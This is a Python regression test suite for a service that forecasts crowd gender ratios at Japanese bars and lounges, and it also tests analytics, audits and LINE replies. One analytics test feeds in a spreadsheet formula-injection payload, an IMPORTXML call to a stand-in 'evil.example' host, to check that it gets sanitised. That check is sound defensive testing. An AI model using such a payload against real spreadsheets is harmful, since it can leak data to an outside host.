"""
tests/test_overnight_audit_fixes.py - 本番テレメトリ監査＆Fable 5.1クロス監査で特定した実在バグの回帰テストスイート
"""

import datetime
import os
import shutil
import sys
import tempfile
import unittest
from unittest import mock

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if ROOT not in sys.path:
    sys.path.insert(0, ROOT)

os.environ.setdefault("DISABLE_SCHEDULER", "1")
os.environ.setdefault("DISABLE_SHEETS", "1")
os.environ.setdefault("SECRET_KEY", "test-overnight-secret-key")

import analytics  # noqa: E402
import data_audit  # noqa: E402
import local_db  # noqa: E402
import moat_intelligence  # noqa: E402
import push_watch  # noqa: E402
import store_master  # noqa: E402

JST = datetime.timezone(datetime.timedelta(hours=9))


class TestOvernightAuditFixes(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls._tmp_dir = tempfile.mkdtemp(prefix="aiseki_overnight_fix_")
        cls._prev_db_path = local_db.DB_PATH
        local_db.DB_PATH = os.path.join(cls._tmp_dir, "overnight_test.db")
        local_db.init_db()

    @classmethod
    def tearDownClass(cls):
        local_db.DB_PATH = cls._prev_db_path
        shutil.rmtree(cls._tmp_dir, ignore_errors=True)

    def setUp(self):
        analytics.reset_for_tests()
        local_db._invalidate_forecast_caches()
        conn = local_db.get_connection()
        try:
            local_db._ensure_moat_rollup_schema()
            local_db._ensure_forecast_schema()
            conn.execute("DELETE FROM store_hourly_rollups")
            conn.execute("DELETE FROM forecast_accuracy_logs")
            conn.execute("DELETE FROM web_push_subscriptions")
            conn.commit()
        finally:
            conn.close()

    def test_asobibar_standing_forecast_eliminates_lounge_mean_reversion_bias(self):
        """ASOBIBAR等の定額スタンディングバーで着席53%平均回帰による+15〜30pt過大予測が起きず、業態別にピア分離されること"""
        early_dt = datetime.datetime(2026, 11, 6, 19, 15, tzinfo=JST)
        peak_dt = datetime.datetime(2026, 11, 6, 22, 30, tzinfo=JST)

        # 実測で女性比25%前後（女6:男18）のASOBIBAR心斎橋・神戸三宮が50%超へ引き上げられないこと
        for sname in ("ASOBIBAR 心斎橋", "ASOBIBAR（アソビバー）神戸 三宮"):
            fc_early = moat_intelligence.predict_store_60m_dynamics(
                sname, 6, 18, True, 0, 0,
                now_jst=early_dt, weather_map={}, apply_online_bias=False, lag_context={}, usual_pair_override=(),
            )
            fc_peak = moat_intelligence.predict_store_60m_dynamics(
                sname, 7, 19, True, 0, 0,
                now_jst=peak_dt, weather_map={}, apply_online_bias=False, lag_context={}, usual_pair_override=(),
            )
            self.assertLessEqual(fc_early["pred_60m_wpct"], 33, f"Early overprediction for {sname}: {fc_early}")
            self.assertGreaterEqual(fc_early["pred_60m_wpct"], 20)
            self.assertLessEqual(fc_peak["pred_60m_wpct"], 33, f"Peak overprediction for {sname}: {fc_peak}")
            self.assertEqual(fc_peak["alert_code"], "male_glut_lock")
            self.assertIn("スタンディング", fc_peak["reason_short"])

        # 同都市ピア集計で着席ラウンジ（女性80%）がASOBIBARにスピルオーバー混入しないこと
        mixed_stores = [
            {"name": "OLG 渋谷本店", "women": 80, "men": 20, "is_open_now": True},
            {"name": "OLG 新宿", "women": 76, "men": 24, "is_open_now": True},
            {"name": "ASOBIBAR 新宿", "women": 8, "men": 22, "is_open_now": True},
            {"name": "ASOBIBAR 渋谷", "women": 9, "men": 21, "is_open_now": True},
        ]
        pmap = moat_intelligence.build_city_peer_context(mixed_stores)
        # ASOBIBAR 新宿のピアは ASOBIBAR 渋谷 (9, 21) のみ
        self.assertEqual(pmap["ASOBIBAR 新宿"]["peer_women"], 9)
        self.assertEqual(pmap["ASOBIBAR 新宿"]["peer_men"], 21)
        self.assertEqual(pmap["ASOBIBAR 新宿"]["peer_stores"], 1)
        # OLG 渋谷本店のピアは OLG 新宿 (76, 24) のみ
        self.assertEqual(pmap["OLG 渋谷本店"]["peer_women"], 76)
        self.assertEqual(pmap["OLG 渋谷本店"]["peer_men"], 24)

    def test_full_batch_closing_horizon_excluded_from_accuracy_scoring(self):
        """本番フルバッチ（>=15店舗）では公式閉店まで45分未満の閉店跨ぎ予測が採点テーブルから除外されること"""
        master_keys = [k for k in store_master.load().keys() if "ソウル" not in k][:18]
        # 平日の翌04:40（翌05:00閉店の OLG 渋谷本店 は mtc=20 < 45、翌06:00閉店の JIS SHINJUKU は mtc=80 >= 45、翌01:00閉店店は 0:0）
        thu_0440 = "2026-11-05 04:40:00"
        items = [{"name": k, "women": 0, "men": 0} for k in master_keys]
        items[0] = {"name": "JIS SHINJUKU", "women": 16, "men": 14}
        items[1] = {"name": "JIS UMEDA", "women": 18, "men": 12}
        items[2] = {"name": "OLG 渋谷本店", "women": 14, "men": 12}

        with mock.patch("moat_intelligence.get_city_weather_map", return_value={}):
            local_db.record_and_resolve_forecasts(items, thu_0440, resolve_only=False)

        recorded = {r[0] for r in local_db._fetch_all_rows("SELECT store_name FROM forecast_accuracy_logs")}
        self.assertNotIn("OLG 渋谷本店", recorded)
        self.assertIn("JIS SHINJUKU", recorded)
        self.assertIn("JIS UMEDA", recorded)

    def test_data_audit_seo_name_resolution_staleness_and_immutability(self):
        """data_audit が /api/status の seo_name を内部解決し、古いスナップショット除外とキャッシュ非汚染を守ること"""
        now_dt = datetime.datetime(2026, 11, 5, 14, 0, tzinfo=JST)  # 昼14時は全店営業時間外
        live_seo_items = [
            {"name": "オリエンタルラウンジ 渋谷本店", "slug": "oriental-lounge-shibuya-honten", "women": 8, "men": 6},
            {"name": "ag（アグ）渋谷", "slug": "ag-shibuya", "women": 0, "men": 0},
            {"name": "ASOBIBAR（アソビバー）新宿", "slug": "asobibar-shinjuku", "women": 0, "men": 0},
        ]
        rep_fresh = data_audit.run_data_audit(
            live_stores=live_seo_items,
            all_events=[],
            now_jst=now_dt,
            live_updated_at="2026-11-05 13:55:00",
        )
        unknown_issues = [i for i in rep_fresh["issues"] if i["type"] == "unknown_live_store"]
        self.assertEqual(unknown_issues, [])
        self.assertEqual(len(rep_fresh["hours_drifts"]), 1)
        self.assertEqual(rep_fresh["hours_drifts"][0]["store"], "OLG 渋谷本店")

        # 30分以上古いスナップショットなら偽ドリフトを出さないこと
        rep_stale = data_audit.run_data_audit(
            live_stores=live_seo_items,
            all_events=[],
            now_jst=now_dt,
            live_updated_at="2026-11-05 13:10:00",
        )
        self.assertEqual(rep_stale["hours_drifts"], [])

        # キャッシュの破壊変更が次回呼び出しへ漏れないこと
        cached_1 = data_audit.run_data_audit(live_stores=[])
        cached_1["issues"].append({"type": "mutated", "message": "poison"})
        cached_2 = data_audit.run_data_audit(live_stores=[])
        self.assertNotIn("mutated", [i.get("type") for i in cached_2["issues"]])

    def test_recurring_rollup_hours_drifts_detects_after_hours_crowds(self):
        """run_full_store_audit.detect_recurring_rollup_hours_drifts が例外なく継続営業時間外稼働を検出すること"""
        import importlib.util

        spec = importlib.util.spec_from_file_location(
            "run_full_store_audit",
            os.path.join(ROOT, ".agents", "skills", "store-audit", "scripts", "run_full_store_audit.py"),
        )
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)

        today = datetime.datetime.now(JST).date()
        d1 = (today - datetime.timedelta(days=2)).isoformat()
        d2 = (today - datetime.timedelta(days=1)).isoformat()
        conn = local_db.get_connection()
        try:
            for bd in (d1, d2):
                # OLG ag渋谷は翌04:00閉店 → 翌05時台（hour_jst=5）に計20名は営業時間外ドリフト
                conn.execute(
                    """
                    INSERT OR REPLACE INTO store_hourly_rollups (
                        date_jst, business_date, hour_jst, store_name, sample_count,
                        avg_women, max_women, avg_men, max_men, avg_wpct
                    ) VALUES (?, ?, 5, 'OLG ag渋谷', 6, 10, 12, 8, 10, 55.0)
                    """,
                    (bd, bd),
                )
            conn.commit()
        finally:
            conn.close()

        notes = mod.detect_recurring_rollup_hours_drifts(days=7)
        self.assertTrue(any("OLG ag渋谷" in n for n in notes), f"Expected drift note, got: {notes}")

    def test_analytics_label_unification_ctr_filtering_and_zero_phantom_adsense(self):
        """store_open正規化・数式無害化・/stats広告拒否・cushion表示・未計測期CTR分離・未導入AdSense=0円を検証"""
        with mock.patch.object(analytics.sheets_store, "read_rows", return_value=[
            # インプレッション計測導入前（昨日）の `@ -` クリックノイズ
            [
                (datetime.datetime.now(JST).date() - datetime.timedelta(days=1)).strftime("%Y-%m-%d"),
                "affiliate_click",
                "women_dating_bachelor @ -",
                "9",
            ],
        ]):
            # 1) 内部名とSEO名の両方で届いた store_open が 1つのキーに合算されること
            analytics.track("store_open", "OLG 長崎")
            analytics.track("store_open", "オリエンタルラウンジ 長崎")
            # 2) 数式インジェクション先頭記号が無害化されること
            analytics.track("share", '=IMPORTXML("https://evil.example","//a")')
            # 3) /stats 由来の affiliate_impression は AGENTS.md §9 に従い拒否されること
            self.assertFalse(analytics.track("affiliate_impression", "dating_bachelor @ /stats"))
            # 4) 当日（imp_days）の正規インプレッション＆クリック
            self.assertTrue(analytics.track("affiliate_impression", "orbis @ /concierge"))
            self.assertTrue(analytics.track("affiliate_impression", "orbis @ /concierge"))
            self.assertTrue(analytics.track("affiliate_click", "orbis @ /concierge"))
            analytics.track("page_view", "/concierge")

            with mock.patch.dict(os.environ, {"ADSENSE_CLIENT_ID": "", "ADSENSE_PUB_ID": ""}, clear=False):
                s = analytics.summary(days=7)

            store_open_map = dict(s["by_label"]["store_open"])
            self.assertEqual(store_open_map.get("OLG 長崎"), 2)
            self.assertNotIn("オリエンタルラウンジ 長崎", store_open_map)
            for share_lbl, _cnt in s["by_label"]["share"]:
                self.assertFalse(share_lbl.startswith("="))

            # 昨日の `@ -` 9件が画面別CTRランキング1位を汚染せず、当日の orbis @ /concierge (CTR 50%) が1位になること
            self.assertGreaterEqual(len(s["cta_surface_ctr"]), 1)
            top_ctr = s["cta_surface_ctr"][0]
            self.assertEqual(top_ctr["slot_id"], "mens_skincare_clinic")
            self.assertEqual(top_ctr["surface"], "/concierge")
            self.assertEqual(top_ctr["impressions"], 2)
            self.assertEqual(top_ctr["clicks"], 1)
            self.assertEqual(top_ctr["ctr_pct"], 50.0)

            # AdSense未設定時は推測値 0円であること
            self.assertFalse(s["revenue"]["adsense_enabled"])
            self.assertEqual(s["revenue"]["est_adsense_yen"], 0)

            # クッションクリックの行き先ラベルが正しく解決されること
            d_conc = analytics.describe_label("cushion_click", "/concierge @ /")
            self.assertIn("/concierge", d_conc["title"])
            self.assertNotIn("/for-women", d_conc["title"])
            d_price = analytics.describe_label("cushion_click", "/price-comparison @ /")
            self.assertIn("/price-comparison", d_price["title"])

    def test_push_watch_staleness_and_line_one_char_area_safety(self):
        """push_watch が古いスナップショットをスキップし、LINE応答が韓国店除外と1文字地名誤爆防止を守ること"""
        res_stale = push_watch.dispatch_matching_watch_pushes(
            [{"name": "OLG 新宿", "women": 25, "men": 10, "is_open_now": True}],
            now_jst=datetime.datetime(2026, 11, 7, 3, 0, tzinfo=JST),
            last_updated="2026-11-07 01:30:00",
        )
        self.assertTrue(res_stale.get("skipped_stale"))

        stores = [
            {"name": "OLG ソウル カンナム", "women": 40, "men": 10},  # region キー欠落でも除外されること
            {"name": "OLG 名古屋 栄", "women": 18, "men": 12},
            {"name": "OLG 新宿", "women": 20, "men": 15},
        ]
        # 「繁栄」という無関係な語では「栄周辺の現在人数」に誤反応せず全国ランキングを返し、かつソウル店を含まないこと
        txt_general = push_watch.build_line_auto_reply_text("繁栄を祈ります", stores, "22:00")
        self.assertNotIn("栄周辺の現在人数", txt_general)
        self.assertNotIn("ソウル", txt_general)
        self.assertNotIn("カンナム", txt_general)

        # 「栄」単体や「名古屋 栄」では正しく栄周辺を返すこと
        txt_sakae = push_watch.build_line_auto_reply_text("栄", stores, "22:00")
        self.assertIn("栄周辺の現在人数", txt_sakae)


class HourlyAnalyticsTests(unittest.TestCase):
    """Verify hybrid 2-tier hourly analytics (00h-23h), business-night Fri/Sat split, Sheets compaction & UI/report."""

    def setUp(self):
        analytics.reset_for_tests()
        analytics.turbo_store.reset_for_tests()

    def tearDown(self):
        analytics.reset_for_tests()
        analytics.turbo_store.reset_for_tests()

    def test_hourly_buckets_midnight_atomicity_and_business_night_split(self):
        # 2026-11-06 is Friday, 2026-11-07 is Saturday, 2026-11-08 is Sunday
        fri_01 = datetime.datetime(2026, 11, 6, 1, 15, tzinfo=JST)   # Thursday late-night -> sun_thu
        sat_21 = datetime.datetime(2026, 11, 7, 21, 59, 59, tzinfo=JST)  # Saturday prime -> fri_sat
        sun_00 = datetime.datetime(2026, 11, 8, 0, 0, 1, tzinfo=JST)     # Saturday late-night -> fri_sat
        sun_15 = datetime.datetime(2026, 11, 8, 15, 30, tzinfo=JST)      # Sunday daytime -> sun_thu

        analytics.track("page_view", "/guide/weekend-strategy", _now_jst=fri_01)
        for _ in range(6):
            analytics.track("page_view", "/", _now_jst=sat_21)
        analytics.track("page_view", "/store/oriental-lounge-shinjuku", _now_jst=sat_21)
        analytics.track("affiliate_impression", "dating_instant @ /store/oriental-lounge-shinjuku", _now_jst=sat_21)
        analytics.track("affiliate_impression", "dating_instant @ /store/oriental-lounge-shinjuku", _now_jst=sat_21)
        analytics.track("affiliate_impression", "dating_instant @ /store/oriental-lounge-shinjuku", _now_jst=sat_21)
        analytics.track("affiliate_click", "dating_instant @ /store/oriental-lounge-shinjuku", _now_jst=sat_21)
        analytics.track("page_view", "/concierge", _now_jst=sun_00)
        analytics.track("cushion_click", "/grooming @ /guide/weekend-strategy", _now_jst=sun_15)
        analytics.track("page_view", "/for-women", _now_jst=sun_15)

        hr = analytics.hourly_summary(days=7, allow_blocking=False, _now_jst=sun_15)
        self.assertTrue(hr["has_hourly_data"])
        seg_all = hr["segments"]["all"]
        seg_fs = hr["segments"]["fri_sat"]
        seg_st = hr["segments"]["sun_thu"]

        # Exact partition identity: fri_sat + sun_thu == all for every hour 0..23
        self.assertEqual(seg_all["pv_total"], 10)
        self.assertEqual(seg_fs["pv_total"] + seg_st["pv_total"], seg_all["pv_total"])
        for h_idx in range(24):
            self.assertEqual(
                seg_fs["hours"][h_idx]["pv"] + seg_st["hours"][h_idx]["pv"],
                seg_all["hours"][h_idx]["pv"],
            )

        # Sunday 00:00:01 belongs to Saturday business night (fri_sat), Friday 01:15 belongs to Thursday night (sun_thu)
        self.assertEqual(seg_fs["hours"][0]["pv"], 1)
        self.assertEqual(seg_st["hours"][0]["pv"], 0)
        self.assertEqual(seg_st["hours"][1]["pv"], 1)
        self.assertEqual(seg_fs["hours"][1]["pv"], 0)

        # M3: Saturday 21:59 + Sunday 00:00 belong to the single Saturday business night (1 active business night)
        self.assertEqual(seg_fs["active_days_count"], 1)
        self.assertEqual(seg_st["active_days_count"], 2)  # Thursday night + Sunday daytime

        # Peak hour & affiliate slot attribution at 21h
        self.assertEqual(seg_all["peak_pv_hours"][0]["hour"], 21)
        self.assertEqual(seg_all["peak_pv_hours"][0]["pv"], 7)
        self.assertEqual(seg_all["hours"][21]["aff_click"], 1)
        self.assertEqual(seg_all["hours"][21]["top_slot_id"], "dating_instant")
        self.assertAlmostEqual(seg_all["hours"][21]["slot_ctr_pct"], 33.33, places=2)

        # Zone sum equals total PV
        self.assertEqual(sum(z["pv"] for z in seg_all["zones"]), seg_all["pv_total"])

    def test_hourly_two_tier_flush_and_sheets_compaction(self):
        import app as app_module
        import archive_data

        now_dt = datetime.datetime.now(JST).replace(hour=22, minute=10, second=0, microsecond=0)
        pg_hourly_batches = []
        sheet_hourly_batches = []

        def fake_pg_hourly(items):
            pg_hourly_batches.append(list(items))
            return True

        def fake_sheet_hourly(title, header, rows):
            sheet_hourly_batches.append((title, list(header), list(rows)))
            return True

        with mock.patch.object(analytics.turbo_store, "is_postgres_active", return_value=True), \
             mock.patch.object(analytics.turbo_store, "analytics_add_batch", return_value=True), \
             mock.patch.object(analytics.turbo_store, "analytics_hourly_add_batch", side_effect=fake_pg_hourly), \
             mock.patch.object(analytics.sheets_store, "append_rows", return_value=True), \
             mock.patch.object(analytics.sheets_store, "append_hourly_rows", side_effect=fake_sheet_hourly):
            analytics.track("page_view", "/", _now_jst=now_dt)
            analytics.track("affiliate_click", "orbis @ /grooming", _now_jst=now_dt)
            analytics.flush(force_sheets=False)
            self.assertEqual(len(pg_hourly_batches), 1)
            self.assertEqual(len(sheet_hourly_batches), 0)

            analytics.track("page_view", "/", _now_jst=now_dt)
            analytics.flush(force_sheets=True)
            self.assertEqual(len(pg_hourly_batches), 2)
            self.assertEqual(len(sheet_hourly_batches), 1)
            self.assertEqual(sheet_hourly_batches[0][0], analytics.HOURLY_SHEET_TITLE)
            bucket_counts = {r[2]: int(r[3]) for r in sheet_hourly_batches[0][2]}
            self.assertEqual(bucket_counts.get("pv_top"), 2)
            self.assertEqual(bucket_counts.get("aff_clk:mens_skincare_clinic"), 1)

        # Verify _compact_analytics_hourly_sheet merges past-day rows and drops >90d expired rows
        today_s = now_dt.strftime("%Y-%m-%d")
        past_s = (now_dt - datetime.timedelta(days=2)).strftime("%Y-%m-%d")
        expired_s = (now_dt - datetime.timedelta(days=95)).strftime("%Y-%m-%d")

        class _FakeHourlyWS:
            def __init__(self, rows):
                self._rows = [list(r) for r in rows]

            def get_all_values(self):
                return [list(r) for r in self._rows]

            def clear(self):
                self._rows = []

            def append_rows(self, rows, value_input_option="RAW"):
                self._rows.extend([list(r) for r in rows])

        class _FakeSS:
            def __init__(self, ws):
                self._ws = ws

            def worksheet(self, name):
                if name == analytics.HOURLY_SHEET_TITLE:
                    return self._ws
                raise KeyError(name)

        ws = _FakeHourlyWS([
            analytics.HOURLY_HEADER,
            [expired_s, "21", "pv_top", "15"],
            [past_s, "22", "pv_top", "10"],
            [past_s, "22", "pv_top", "14"],
            [today_s, "22", "pv_top", "5"],
        ])
        comp = archive_data._compact_analytics_hourly_sheet(_FakeSS(ws), hourly_days=90, dry_run=False)
        self.assertEqual(comp["rows_before"], 4)
        self.assertEqual(comp["rows_after"], 2)
        self.assertEqual(comp["deleted_rows"], 2)
        self.assertEqual(ws.get_all_values()[1], [past_s, "22", "pv_top", "24"])

        # Verify /staff/analytics renders #sec-hourly cleanly
        app_module.app.config["TESTING"] = True
        client = app_module.app.test_client()
        with client.session_transaction() as sess:
            sess["is_staff"] = True
            sess["is_master"] = True
        analytics.track("page_view", "/guide/weekend-strategy", _now_jst=now_dt)
        resp = client.get("/staff/analytics?days=7")
        self.assertEqual(resp.status_code, 200)
        html = resp.get_data(as_text=True)
        self.assertIn('id="sec-hourly"', html)
        self.assertIn("時間帯別アクセス・収益アクション波形", html)
        self.assertIn('data-hseg="fri_sat"', html)

        # Verify daily_pv_report integrates Analytics Hourly golden-time section without stripping DISABLE_SHEETS on import (M1)
        prev_disable_sheets = os.environ.get("DISABLE_SHEETS")
        os.environ["DISABLE_SHEETS"] = "1"
        try:
            import importlib.util
            spec = importlib.util.spec_from_file_location(
                "daily_pv_report",
                os.path.join(os.path.dirname(os.path.dirname(__file__)), ".agents", "skills", "growth-pdca", "scripts", "daily_pv_report.py"),
            )
            dpr_mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(dpr_mod)
            self.assertEqual(os.environ.get("DISABLE_SHEETS"), "1")
        finally:
            if prev_disable_sheets is None:
                os.environ.pop("DISABLE_SHEETS", None)
            else:
                os.environ["DISABLE_SHEETS"] = prev_disable_sheets

        mock_daily = [[past_s, "page_view", "/", "20"], [past_s, "affiliate_click", "orbis @ /grooming", "2"]]
        mock_hourly = [
            [past_s, "21", "pv_top", "12"],
            [past_s, "21", "aff_imp", "10"],
            [past_s, "21", "aff_clk:mens_skincare_clinic", "2"],
            [past_s, "22", "pv_guide", "8"],
            # M5: late click in a 0-PV zone (03:00) must yield pv_ctr_pct=None and format cleanly without TypeError
            [past_s, "3", "aff_clk:mens_skincare_clinic", "1"],
        ]
        with mock.patch.object(analytics.sheets_store, "read_rows", return_value=mock_daily), \
             mock.patch.object(analytics.sheets_store, "read_hourly_rows", return_value=mock_hourly):
            rep = dpr_mod.build_daily_report(past_s)
            md = dpr_mod.format_markdown(rep)
            self.assertTrue(rep["hourly"]["has_day_data"])
            self.assertEqual(rep["hourly"]["day"]["peak_pv_hours"][0]["hour"], 21)
            late_zone = next(z for z in rep["hourly"]["day"]["zones"] if z["key"] == "deep_morning")
            self.assertIsNone(late_zone["pv_ctr_pct"])
            self.assertIn("### 6. 時間帯別ゴールデンタイム分析（00〜23時）", md)
            self.assertIn("ORBIS Mr.（スキンケア）", md)
            self.assertNotIn("対PV None%", md)
            self.assertIn("**1** (-)", md)

    def test_hourly_rewrite_mutex_deferral_and_displaced_header_guard(self):
        """H1/M5 regression: rewrite mutex defers Sheets append safely; displaced headers never drop row 0; 0-PV click renders cleanly."""
        import app as app_module

        now_dt = datetime.datetime(2026, 11, 7, 23, 15, tzinfo=JST)
        late_clk_dt = datetime.datetime(2026, 11, 7, 3, 5, tzinfo=JST)
        sheet_calls = []

        def fake_append_hourly(title, header, rows):
            sheet_calls.append(list(rows))
            return True

        # Acquire rewrite mutex -> flush(force_sheets=True) must defer Sheets append into retry queue
        token = analytics.turbo_store.acquire_named_mutex("sheets_analytics_rewrite", ttl_sec=60)
        self.assertTrue(token)
        try:
            with mock.patch.object(analytics.turbo_store, "is_postgres_active", return_value=False), \
                 mock.patch.object(analytics.sheets_store, "append_rows", return_value=True), \
                 mock.patch.object(analytics.sheets_store, "append_hourly_rows", side_effect=fake_append_hourly):
                analytics.track("page_view", "/", _now_jst=now_dt)
                analytics.track("affiliate_click", "orbis @ /grooming", _now_jst=late_clk_dt)  # 0 PV at 03h, 1 click
                analytics.flush(force_sheets=True)
                self.assertEqual(len(sheet_calls), 0)  # Deferred while rewrite lock is held
        finally:
            analytics.turbo_store.release_named_mutex("sheets_analytics_rewrite")

        # Once mutex is released, next flush(force_sheets=True) writes all deferred rows without loss
        with mock.patch.object(analytics.turbo_store, "is_postgres_active", return_value=False), \
             mock.patch.object(analytics.sheets_store, "append_rows", return_value=True), \
             mock.patch.object(analytics.sheets_store, "append_hourly_rows", side_effect=fake_append_hourly):
            analytics.flush(force_sheets=True)
            self.assertEqual(len(sheet_calls), 1)
            flushed_buckets = {r[2]: int(r[3]) for r in sheet_calls[0]}
            self.assertEqual(flushed_buckets.get("pv_top"), 1)
            self.assertEqual(flushed_buckets.get("aff_clk:mens_skincare_clinic"), 1)

        # Displaced header guard: if row 0 is data and row 1 is header, row 0 must NOT be dropped
        displaced = [
            ["2026-11-06", "21", "pv_top", "9"],
            analytics.HOURLY_HEADER,
            ["2026-11-06", "22", "pv_guide", "4"],
        ]
        cleaned = analytics.sheets_store._strip_sheet_headers(displaced, analytics.HOURLY_HEADER)
        self.assertEqual(len(cleaned), 2)
        self.assertEqual(cleaned[0], ["2026-11-06", "21", "pv_top", "9"])
        self.assertEqual(cleaned[1], ["2026-11-06", "22", "pv_guide", "4"])

        # Render /staff/analytics when hour 03 has 0 PV & 1 click -> no TypeError, no '対PV None%' or '対PV 0.0%'
        app_module.app.config["TESTING"] = True
        client = app_module.app.test_client()
        with client.session_transaction() as sess:
            sess["is_staff"] = True
            sess["is_master"] = True
        analytics.track("affiliate_click", "orbis @ /grooming", _now_jst=late_clk_dt)
        resp = client.get("/staff/analytics?days=7")
        self.assertEqual(resp.status_code, 200)
        html = resp.get_data(as_text=True)
        self.assertNotIn("対PV None%", html)
        self.assertNotIn("(対PV 0.0%)", html)
        self.assertIn("CTR: <strong>-</strong>", html)
        self.assertIn("営業夜", html)


if __name__ == "__main__":
    unittest.main()
